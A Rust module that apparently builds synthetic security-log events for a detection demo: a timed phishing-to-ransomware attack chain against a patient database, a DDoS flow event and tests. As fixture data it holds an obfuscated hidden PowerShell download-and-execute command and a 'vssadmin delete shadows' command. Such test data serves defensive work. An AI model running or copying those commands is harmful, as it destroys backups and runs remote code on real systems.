

use chrono::{DateTime, Duration, Utc};
use librax_enrichment::{demo, hashes};
use librax_types::{RawEvent, SourceType};
use serde_json::json;


pub const CHAIN_OFFSETS_MINUTES: [i64; 11] = [0, 3, 4, 7, 11, 16, 19, 23, 26, 29, 31];

fn raw(
    id: &str,
    source_type: SourceType,
    source_id: &str,
    at: DateTime<Utc>,
    payload: serde_json::Value,
) -> RawEvent {
    RawEvent {
        raw_id: id.to_string(),
        source_type,
        source_id: source_id.to_string(),
        received_at: at,
        payload,
    }
}


pub fn attack_chain(start: DateTime<Utc>) -> Vec<RawEvent> {
    let at = |minutes: i64| start + Duration::minutes(minutes);
    let o = CHAIN_OFFSETS_MINUTES;

    vec![

        raw(
            "EVT-01",
            SourceType::Email,
            "email-gw-01",
            at(o[0]),
            json!({
                "event": "mail_delivered",
                "recipient": demo::USER,
                "sender": format!("hr-benefits@{}", demo::PHISHING_DOMAIN),
                "sender_domain": demo::PHISHING_DOMAIN,
                "subject": "Q3 Benefits Enrolment - Action Required Today",
                "attachment_name": "Benefits_Enrolment.docm",
                "attachment_macro": true,
                "attachment_sha256": hashes::LURE_SHA256,
                "attachment_md5": hashes::LURE_MD5,
                "embedded_url": format!("https://{}/enrol", demo::PHISHING_DOMAIN),
                "spf": "fail",
                "dkim": "fail",
                "dmarc": "fail",
                "lookalike_of": "secure-docs-review.org",
                "recipient_clicked": true
            }),
        ),

        raw(
            "EVT-02",
            SourceType::Vpn,
            "vpn-campus-04",
            at(o[1]),
            json!({
                "event": "session_start",
                "user": demo::USER,
                "client_ip": "203.0.113.77",
                "client_country": "RO",
                "previous_country": "IN",
                "minutes_since_previous_session": 41,
                "assigned_ip": demo::ENDPOINT_IP,
                "mfa_method": "push",
                "mfa_prompts": 6,
                "mfa_accepted_after": 6
            }),
        ),

        raw(
            "EVT-03",
            SourceType::Edr,
            "edr-campus-04",
            at(o[2]),
            json!({
                "event_type": "process_create",
                "device_name": demo::ENDPOINT,
                "user_name": demo::USER,
                "process_name": "powershell.exe",
                "parent_process": "WINWORD.EXE",
                "process_cmdline": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",


                "process_sha256": hashes::POWERSHELL_SHA256,
                "process_md5": hashes::POWERSHELL_MD5,
                "signed": true,
                "signer": "Microsoft Windows",
                "pid": 7412
            }),
        ),

        raw(
            "EVT-04",
            SourceType::Firewall,
            "fw-edge-04",
            at(o[3]),
            json!({
                "action": "allow",
                "src": demo::ENDPOINT_IP,
                "dst": demo::ATTACKER_IP,
                "dst_domain": demo::C2_DOMAIN,
                "dport": 443,
                "proto": "tcp",
                "bytes_out": 18432,
                "bytes_in": 2140,
                "rule": "OUTBOUND-WEB",
                "connection_count": 34,
                "interval_seconds_mean": 62.4,
                "interval_seconds_stddev": 1.8,
                "domain_age_days": 4
            }),
        ),

        raw(
            "EVT-05",
            SourceType::Firewall,
            "fw-edge-04",
            at(o[4]),
            json!({
                "event": "flow_summary",
                "src": demo::ENDPOINT_IP,
                "window_seconds": 90,
                "distinct_destinations": 312,
                "distinct_ports": 18,
                "connections_denied": 287,
                "connections_allowed": 25,
                "baseline_distinct_destinations": 9
            }),
        ),

        raw(
            "EVT-06",
            SourceType::ActiveDirectory,
            "ad-campus-04",
            at(o[5]),
            json!({
                "EventID": 4625,
                "TargetUserName": demo::PRIVILEGED_ACCOUNT,
                "WorkstationName": demo::ENDPOINT,
                "IpAddress": demo::ENDPOINT_IP,
                "LogonType": 3,
                "failure_count": 14,
                "window_seconds": 120,
                "distinct_accounts_targeted": 6,
                "followed_by_success": true,
                "success_event_id": 4624
            }),
        ),

        raw(
            "EVT-07",
            SourceType::Server,
            "srv-app-07",
            at(o[6]),
            json!({
                "host": demo::APP_SERVER,
                "event": "remote_logon",
                "user": demo::USER,
                "src_ip": demo::ENDPOINT_IP,
                "service": "WinRM",
                "logon_type": 3,
                "first_time_for_user": true,
                "source_is_workstation": true
            }),
        ),

        raw(
            "EVT-08",
            SourceType::Pam,
            "pam-core-01",
            at(o[7]),
            json!({
                "event": "session_checkout",
                "requester": demo::USER,
                "account": demo::PRIVILEGED_ACCOUNT,
                "target_host": demo::DB_SERVER,
                "session_id": "PAM-284",
                "approval": "auto",
                "outside_change_window": true,
                "requester_first_use_of_account": true
            }),
        ),

        raw(
            "EVT-09",
            SourceType::Database,
            "db-patient-01",
            at(o[8]),
            json!({
                "instance": demo::PATIENT_DB,
                "host": demo::DB_SERVER,
                "principal": demo::PRIVILEGED_ACCOUNT,
                "statement": "SELECT * FROM patient_records WHERE admitted_on > '2020-01-01'",
                "rows_returned": 184230,
                "baseline_rows_returned": 420,
                "duration_ms": 41280,
                "contains_phi": true
            }),
        ),

        raw(
            "EVT-10",
            SourceType::Edr,
            "edr-campus-04",
            at(o[9]),
            json!({
                "event_type": "file_create",
                "device_name": demo::DB_SERVER,
                "user_name": demo::PRIVILEGED_ACCOUNT,
                "file_name": demo::STAGED_FILE,
                "file_path": "C:\\Windows\\Temp\\archive_patient_export.zip",
                "file_size_bytes": 2_147_483_648i64,
                "process_name": "7z.exe",
                "process_sha256": hashes::SEVENZIP_SHA256,
                "process_md5": hashes::SEVENZIP_MD5,
                "is_archive": true,
                "in_temp_directory": true,
                "source_records": 184230
            }),
        ),

        raw(
            "EVT-11",
            SourceType::Edr,
            "edr-campus-04",
            at(o[10]),
            json!({
                "event_type": "process_create",
                "device_name": demo::DB_SERVER,
                "user_name": demo::PRIVILEGED_ACCOUNT,
                "process_name": "vssadmin.exe",
                "parent_process": "powershell.exe",
                "process_cmdline": "vssadmin.exe delete shadows /all /quiet",
                "process_sha256": hashes::VSSADMIN_SHA256,
                "process_md5": hashes::VSSADMIN_MD5,
                "shadow_copy_deletion": true,
                "files_modified_per_minute": 1840,
                "new_extensions_observed": ["*.locked"],
                "entropy_increase": true
            }),
        ),
    ]
}


pub fn ddos_burst(at: DateTime<Utc>) -> RawEvent {
    raw(
        "EVT-DDOS-01",
        SourceType::Firewall,
        "fw-edge-11",
        at,
        json!({
            "event": "flow_summary",
            "dst": "10.30.3.7",
            "dst_hostname": "C11-FW-EDGE-01",
            "window_seconds": 60,
            "connections_per_minute": 1_800_000i64,
            "baseline_connections_per_minute": 12_000i64,
            "unique_sources": 4231,
            "destination_concentration": 0.97,
            "connections_denied": 1_612_400i64
        }),
    )
}


pub fn default_start(now: DateTime<Utc>) -> DateTime<Utc> {
    now.date_naive()
        .and_hms_opt(9, 1, 0)
        .map(|naive| naive.and_utc())
        .unwrap_or(now)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chain_has_eleven_ordered_events() {
        let start = Utc::now();
        let chain = attack_chain(start);
        assert_eq!(chain.len(), 11);

        for pair in chain.windows(2) {
            assert!(
                pair[0].received_at <= pair[1].received_at,
                "chain must read as a timeline"
            );
        }
    }

    #[test]
    fn event_ids_are_unique_and_stable() {
        let chain = attack_chain(Utc::now());
        let mut ids: Vec<_> = chain.iter().map(|e| e.raw_id.clone()).collect();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), 11);
        assert_eq!(chain[0].raw_id, "EVT-01");
        assert_eq!(chain[10].raw_id, "EVT-11");
    }

    #[test]
    fn chain_spans_thirty_one_minutes() {
        let start = Utc::now();
        let chain = attack_chain(start);
        let span = chain[10].received_at - chain[0].received_at;
        assert_eq!(span.num_minutes(), 31);
    }

    #[test]
    fn chain_touches_every_required_source() {
        let chain = attack_chain(Utc::now());
        for required in [
            SourceType::Email,
            SourceType::Vpn,
            SourceType::Edr,
            SourceType::Firewall,
            SourceType::ActiveDirectory,
            SourceType::Server,
            SourceType::Pam,
            SourceType::Database,
        ] {
            assert!(
                chain.iter().any(|e| e.source_type == required),
                "{required:?} missing from the chain"
            );
        }
    }
}
